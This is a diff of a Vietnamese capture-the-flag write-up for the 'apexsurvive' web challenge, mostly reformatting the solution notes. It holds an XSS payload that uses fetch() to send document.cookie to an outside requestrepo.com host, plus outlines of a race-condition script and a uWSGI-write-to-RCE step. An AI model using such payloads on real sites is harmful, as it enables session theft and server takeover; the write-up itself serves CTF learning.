@@ -11,11 +11,16 @@ Created: September 14, 2025 11:23 AM
 
 ![image.png](/uploads/apexsurvive/apexsurvive/image.png)
 
-- Ý tưởng: Nhận thấy bot chỉ visit product id, hoặc nhiều hướng khác nhưng hướng ở đây unintended
-- Ta race để có internal account
-- post lên product note chèn payload xss $&#123;fetch('[https://k31x5f3u.requestrepo.com/?'+document.cookie](https://k31x5f3u.requestrepo.com/?%27+document.cookie))&#125;, payload bypass check dom
-- lấy được cookie admin ra ngoài
-- tiếp ta tận dụng uwsgi arbitrary write để lên rce qua chức năng post pdf file
+- Ý tưởng: nhận thấy bot chỉ visit product id, có nhiều hướng khác nhưng hướng ở đây là unintended.
+- Ta race để có internal account.
+- Post lên product note chèn payload XSS, bypass DOM check:
+
+  ```
+  ${fetch('https://k31x5f3u.requestrepo.com/?' + document.cookie)}
+  ```
+
+- Lấy cookie admin ra ngoài.
+- Tiếp tục tận dụng uWSGI arbitrary write để RCE qua chức năng post PDF.
 
 ```python
 #!/usr/bin/env python3
@@ -64,7 +69,7 @@ async def test():
         tasks = []
         for i, email in enumerate(EMAILS):
             tasks.append(asyncio.create_task(post_profile(c, email)))
-            
+
         await asyncio.gather(*tasks)
         # await asyncio.sleep(0.5)
 
@@ -78,8 +83,8 @@ if __name__ == "__main__":
     while True:
         asyncio.run(test())
         check()
-        time.sleep(1)    
-    
+        time.sleep(1)
+
 
 ```
 
@@ -104,5 +109,5 @@ pdf.image('./test.jpg')
 pdf.output('payload.pdf', 'F')
 ```
 
-- Ý tưởng bài này intended rất khó, có thể đọc để tham khảo thêm
+- Ý tưởng intended của bài này rất khó, có thể đọc để tham khảo thêm:
 - https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/web/%5BInsane%5D%20apexsurvive/official_writeup.md
